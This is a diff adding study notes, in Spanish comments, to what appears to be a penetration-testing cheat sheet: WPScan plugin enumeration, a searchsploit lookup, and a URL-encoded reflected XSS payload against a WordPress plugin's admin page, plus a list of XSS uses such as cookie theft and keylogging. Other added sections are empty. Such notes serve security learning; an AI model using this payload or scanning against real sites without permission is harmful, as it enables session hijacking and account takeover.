@@ -1442,7 +1442,73 @@ amass intel -active -whois -d zonetransfer.me -dir /home/kali/Desktop/ZTME_Intel
 
 ### ~ XSS
 
+#### Identifying & Exploiting Reflected XSS Vulnerabilities
+
+```bash
+# XSS Reflected 
+# El payload NO se guarda en el servidor/base de datos, solo se refleja 
+# de vuelta en la respuesta HTTP inmediata a la petición que lo contiene 
+# (por eso "reflected" - rebota y ya)
+
+sudo apt-get install wpscan # instalación
+wpscan --help # opciones
+
+# escaneo básico sin api token
+wpscan --url <url> # escaneo normal
+wpscan --url <url> --enumerate p --plugin-detection aggressive # escanear plugins de manera agresiva pero más ruidosa
+
+# escaneo con api
+wpscan --url <url> --enumerate p --plugin-detection aggressive --api-token <token>
+# El --api-token permite consultar la base de datos de vulnerabilidades de WPScan (WPVulnDB)
+# así WPScan puede indicar si algún plugin/tema/core detectado tiene CVEs conocidos
+
+# buscamos exploits/PoCs conocidos
+searchsploit Relevanssi
+# También se puede buscar directamente en exploit-db.com y revisar el PoC
+
+# El PoC muestra un parámetro vulnerable en la URL del plugin que refleja
+# input del usuario sin sanitizar -> Reflected XSS
+# Payload de ejemplo (URL-encoded) para el parámetro "tab":
+/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab='><SCRIPT>var+x+%3D+String(%2FXSS%2F)%3Bx+%3D+x.substring(1%2C+x.length-1)%3Balert(x)<%2FSCRIPT><BR+
+
+# Se edita la URL reemplazando el dominio por el del WordPress target,
+# se carga en el navegador (autenticado como admin/víctima) y el JS se
+# ejecuta -> salta el alert() del XSS
+
+# Qué se puede lograr con un XSS (más allá del alert() de prueba):
+# - Robo de cookies de sesión (document.cookie) -> session hijacking
+# - Keylogging o captura de datos ingresados en formularios de la víctima
+# - Realizar acciones en nombre de la víctima (ej: crear un usuario admin
+#   si la víctima es un admin logueado) sin que se dé cuenta
+# - Redirigir a la víctima a un sitio de phishing para robar credenciales
+```
+
+#### Identifying & Exploiting Stored XSS Vulnerabilities
+
+```bash
+```
+
+#### Identifying & Exploiting DOM-Based XSS Vulnerabilities
+
+```bash
+```
+
 ### ~ SQLi
+
+#### Finding SQL Injection Vulnerabilities
+
+```bash
+```
+
+#### Exploiting Error-Based SQL Injection Vulnerabilities 
+
+```bash
+```
+
+#### Exploiting Union-Based SQL Injection Vulnerabilities
+
+```bash
+```
 
 ## 04 - Network Penetration Testing
 
